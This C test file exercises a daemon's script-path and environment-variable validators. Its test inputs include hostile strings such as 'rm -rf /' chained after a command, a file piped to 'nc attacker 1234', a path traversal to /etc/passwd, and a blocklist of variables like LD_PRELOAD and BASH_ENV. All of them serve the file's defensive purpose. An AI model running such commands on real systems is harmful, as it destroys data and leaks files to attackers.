/* © 2025 Casey Koons All rights reserved */

/*
 * test_security_validation.c - Tests for security validation functions
 *
 * Tests validate_script_path() and is_safe_env_var() functions
 * that prevent command injection and environment variable attacks.
 *
 * Note: Functions are duplicated here for standalone testing.
 * The production versions are in katra_daemon.c
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>

/* Test counters */
static int tests_run = 0;
static int tests_passed = 0;

#define TEST(name) \
    do { \
        tests_run++; \
        printf("Testing: %s ... ", name); \
    } while(0)

#define PASS() \
    do { \
        tests_passed++; \
        printf(" ✓\n"); \
    } while(0)

#define FAIL(msg) \
    do { \
        printf(" ✗ FAILED: %s\n", msg); \
    } while(0)

#define ASSERT(cond, msg) \
    do { \
        if (!(cond)) { \
            FAIL(msg); \
            return; \
        } \
    } while(0)

/* ============================================================================
 * SECURITY VALIDATION FUNCTIONS (copied from katra_daemon.c for testing)
 * ============================================================================ */

/* Dangerous environment variables that should never be set by external input */
static const char* DANGEROUS_ENV_VARS[] = {
    "LD_PRELOAD", "LD_LIBRARY_PATH", "PATH", "HOME", "USER",
    "SHELL", "IFS", "CDPATH", "ENV", "BASH_ENV", NULL
};

/* Check if an environment variable name is safe to set
 * Returns true if safe, false if the variable is dangerous */
static bool is_safe_env_var(const char* var_name) {
    if (!var_name || strlen(var_name) == 0) {
        return false;
    }

    /* Check against blocklist */
    for (int i = 0; DANGEROUS_ENV_VARS[i] != NULL; i++) {
        if (strcmp(var_name, DANGEROUS_ENV_VARS[i]) == 0) {
            return false;
        }
    }

    /* Check for suspicious characters */
    for (const char* p = var_name; *p; p++) {
        if (*p == '=' || *p == '\n' || *p == '\0') {
            return false;
        }
    }

    return true;
}

/* Validate a script path to prevent command injection
 * Returns true if the path is safe, false otherwise */
static bool validate_script_path(const char* path) {
    if (!path || strlen(path) == 0) {
        return false;
    }

    /* Check for command injection characters */
    const char* dangerous_chars = ";|&$`\\\"'<>(){}[]!#";
    for (const char* p = path; *p; p++) {
        if (strchr(dangerous_chars, *p) != NULL) {
            return false;
        }
    }

    /* Check for path traversal attempts */
    if (strstr(path, "..") != NULL) {
        return false;
    }

    /* Must be absolute path or relative to known safe directory */
    if (path[0] != '/' && path[0] != '.') {
        /* Relative path - check it doesn't start with dangerous patterns */
        if (strncmp(path, "~", 1) == 0) {
            return false;
        }
    }

    return true;
}

/* ============================================================================
 * validate_script_path() tests
 * ============================================================================ */

static void test_valid_absolute_path(void) {
    TEST("valid absolute path");
    ASSERT(validate_script_path("/usr/bin/script.sh") == true,
           "Should accept valid absolute path");
    PASS();
}

static void test_valid_relative_path(void) {
    TEST("valid relative path");
    ASSERT(validate_script_path("./scripts/run.sh") == true,
           "Should accept valid relative path");
    PASS();
}

static void test_path_with_semicolon(void) {
    TEST("path with semicolon (command injection)");
    ASSERT(validate_script_path("/bin/ls; rm -rf /") == false,
           "Should reject path with semicolon");
    PASS();
}

static void test_path_with_pipe(void) {
    TEST("path with pipe (command injection)");
    ASSERT(validate_script_path("/bin/cat file | nc attacker 1234") == false,
           "Should reject path with pipe");
    PASS();
}

static void test_path_with_ampersand(void) {
    TEST("path with ampersand (command injection)");
    ASSERT(validate_script_path("/bin/ls & rm -rf /") == false,
           "Should reject path with ampersand");
    PASS();
}

static void test_path_with_backtick(void) {
    TEST("path with backtick (command substitution)");
    ASSERT(validate_script_path("/bin/`whoami`") == false,
           "Should reject path with backtick");
    PASS();
}

static void test_path_with_dollar(void) {
    TEST("path with dollar (variable expansion)");
    ASSERT(validate_script_path("/bin/$PATH") == false,
           "Should reject path with dollar sign");
    PASS();
}

static void test_path_traversal(void) {
    TEST("path traversal attack");
    ASSERT(validate_script_path("/etc/../../../etc/passwd") == false,
           "Should reject path traversal");
    PASS();
}

static void test_path_with_tilde(void) {
    TEST("path starting with tilde");
    ASSERT(validate_script_path("~/.bashrc") == false,
           "Should reject tilde expansion");
    PASS();
}

static void test_null_path(void) {
    TEST("NULL path");
    ASSERT(validate_script_path(NULL) == false,
           "Should reject NULL path");
    PASS();
}

static void test_empty_path(void) {
    TEST("empty path");
    ASSERT(validate_script_path("") == false,
           "Should reject empty path");
    PASS();
}

static void test_path_with_quotes(void) {
    TEST("path with quotes");
    ASSERT(validate_script_path("/bin/echo \"hello\"") == false,
           "Should reject path with quotes");
    PASS();
}

static void test_path_with_parentheses(void) {
    TEST("path with parentheses (subshell)");
    ASSERT(validate_script_path("/bin/(ls)") == false,
           "Should reject path with parentheses");
    PASS();
}

/* ============================================================================
 * is_safe_env_var() tests
 * ============================================================================ */

static void test_safe_env_var(void) {
    TEST("safe environment variable");
    ASSERT(is_safe_env_var("MY_CUSTOM_VAR") == true,
           "Should accept safe variable name");
    PASS();
}

static void test_safe_env_var_lowercase(void) {
    TEST("safe environment variable (lowercase)");
    ASSERT(is_safe_env_var("my_app_config") == true,
           "Should accept lowercase variable name");
    PASS();
}

static void test_dangerous_ld_preload(void) {
    TEST("dangerous LD_PRELOAD");
    ASSERT(is_safe_env_var("LD_PRELOAD") == false,
           "Should reject LD_PRELOAD");
    PASS();
}

static void test_dangerous_ld_library_path(void) {
    TEST("dangerous LD_LIBRARY_PATH");
    ASSERT(is_safe_env_var("LD_LIBRARY_PATH") == false,
           "Should reject LD_LIBRARY_PATH");
    PASS();
}

static void test_dangerous_path(void) {
    TEST("dangerous PATH");
    ASSERT(is_safe_env_var("PATH") == false,
           "Should reject PATH");
    PASS();
}

static void test_dangerous_home(void) {
    TEST("dangerous HOME");
    ASSERT(is_safe_env_var("HOME") == false,
           "Should reject HOME");
    PASS();
}

static void test_dangerous_shell(void) {
    TEST("dangerous SHELL");
    ASSERT(is_safe_env_var("SHELL") == false,
           "Should reject SHELL");
    PASS();
}

static void test_dangerous_ifs(void) {
    TEST("dangerous IFS");
    ASSERT(is_safe_env_var("IFS") == false,
           "Should reject IFS");
    PASS();
}

static void test_dangerous_bash_env(void) {
    TEST("dangerous BASH_ENV");
    ASSERT(is_safe_env_var("BASH_ENV") == false,
           "Should reject BASH_ENV");
    PASS();
}

static void test_null_env_var(void) {
    TEST("NULL environment variable");
    ASSERT(is_safe_env_var(NULL) == false,
           "Should reject NULL");
    PASS();
}

static void test_empty_env_var(void) {
    TEST("empty environment variable");
    ASSERT(is_safe_env_var("") == false,
           "Should reject empty string");
    PASS();
}

static void test_env_var_with_equals(void) {
    TEST("environment variable with equals sign");
    ASSERT(is_safe_env_var("VAR=value") == false,
           "Should reject variable with equals");
    PASS();
}

static void test_env_var_with_newline(void) {
    TEST("environment variable with newline");
    ASSERT(is_safe_env_var("VAR\nNAME") == false,
           "Should reject variable with newline");
    PASS();
}

/* ============================================================================
 * Main
 * ============================================================================ */

int main(void) {
    printf("\n========================================\n");
    printf("Security Validation Tests\n");
    printf("========================================\n\n");

    printf("--- validate_script_path() tests ---\n");
    test_valid_absolute_path();
    test_valid_relative_path();
    test_path_with_semicolon();
    test_path_with_pipe();
    test_path_with_ampersand();
    test_path_with_backtick();
    test_path_with_dollar();
    test_path_traversal();
    test_path_with_tilde();
    test_null_path();
    test_empty_path();
    test_path_with_quotes();
    test_path_with_parentheses();

    printf("\n--- is_safe_env_var() tests ---\n");
    test_safe_env_var();
    test_safe_env_var_lowercase();
    test_dangerous_ld_preload();
    test_dangerous_ld_library_path();
    test_dangerous_path();
    test_dangerous_home();
    test_dangerous_shell();
    test_dangerous_ifs();
    test_dangerous_bash_env();
    test_null_env_var();
    test_empty_env_var();
    test_env_var_with_equals();
    test_env_var_with_newline();

    printf("\n========================================\n");
    printf("Test Results:\n");
    printf("  Tests run:    %d\n", tests_run);
    printf("  Tests passed: %d\n", tests_passed);
    printf("  Tests failed: %d\n", tests_run - tests_passed);
    printf("========================================\n\n");

    if (tests_passed == tests_run) {
        printf("========================================\n");
        printf("All tests passed!\n");
        printf("========================================\n");
        return 0;
    } else {
        printf("Some tests FAILED!\n");
        return 1;
    }
}
